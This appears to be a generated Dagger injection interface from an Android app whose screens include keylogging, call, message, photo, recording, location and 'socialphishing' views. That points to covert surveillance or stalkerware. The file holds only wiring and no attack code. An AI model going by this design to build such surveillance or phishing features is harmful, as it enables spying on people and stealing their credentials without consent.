package com.example.rule.dash.di.component;

@com.example.rule.dash.di.PerActivity()
@dagger.Component(dependencies = {com.example.rule.dash.di.component.AppComponent.class}, modules = {com.example.rule.dash.di.module.ActivityModule.class})
@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000^\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\bg\u0018\u00002\u00020\u0001J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0004\u001a\u00020\u0005H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0006\u001a\u00020\u0007H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\b\u001a\u00020\tH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\n\u001a\u00020\u000bH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\f\u001a\u00020\rH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u000e\u001a\u00020\u000fH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0010\u001a\u00020\u0011H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0012\u001a\u00020\u0013H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0014\u001a\u00020\u0015H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0016\u001a\u00020\u0017H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0018\u001a\u00020\u0019H&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u001a\u001a\u00020\u001bH&J\u0010\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u001c\u001a\u00020\u001dH&\u00a8\u0006\u001e"}, d2 = {"Lcom/example/rule/dash/di/component/ActivityComponent;", "", "inject", "", "loginActivity", "Lcom/example/rule/dash/ui/activities/login/LoginActivity;", "mainChildActivity", "Lcom/example/rule/dash/ui/activities/mainchild/MainChildActivity;", "mainParentActivity", "Lcom/example/rule/dash/ui/activities/mainparent/MainParentActivity;", "registerActivity", "Lcom/example/rule/dash/ui/activities/register/RegisterActivity;", "socialActivityM", "Lcom/example/rule/dash/ui/activities/socialphishing/SocialActivityM;", "callsFragment", "Lcom/example/rule/dash/ui/fragments/calls/CallsFragment;", "keysFragment", "Lcom/example/rule/dash/ui/fragments/keylog/KeysFragment;", "mapsFragment", "Lcom/example/rule/dash/ui/fragments/maps/MapsFragment;", "messageFragment", "Lcom/example/rule/dash/ui/fragments/message/MessageFragment;", "notifyMessageFragment", "Lcom/example/rule/dash/ui/fragments/notifications/NotifyMessageFragment;", "photoFragment", "Lcom/example/rule/dash/ui/fragments/photo/PhotoFragment;", "recordingFragment", "Lcom/example/rule/dash/ui/fragments/recording/RecordingFragment;", "socialFragment", "Lcom/example/rule/dash/ui/fragments/social/SocialFragment;", "app_debug"})
public abstract interface ActivityComponent {
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.activities.login.LoginActivity loginActivity);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.activities.register.RegisterActivity registerActivity);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.activities.mainparent.MainParentActivity mainParentActivity);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.activities.mainchild.MainChildActivity mainChildActivity);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.activities.socialphishing.SocialActivityM socialActivityM);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.fragments.maps.MapsFragment mapsFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.fragments.calls.CallsFragment callsFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.fragments.message.MessageFragment messageFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.fragments.photo.PhotoFragment photoFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.fragments.keylog.KeysFragment keysFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.fragments.social.SocialFragment socialFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.fragments.recording.RecordingFragment recordingFragment);
    
    public abstract void inject(@org.jetbrains.annotations.NotNull()
    com.example.rule.dash.ui.fragments.notifications.NotifyMessageFragment notifyMessageFragment);
}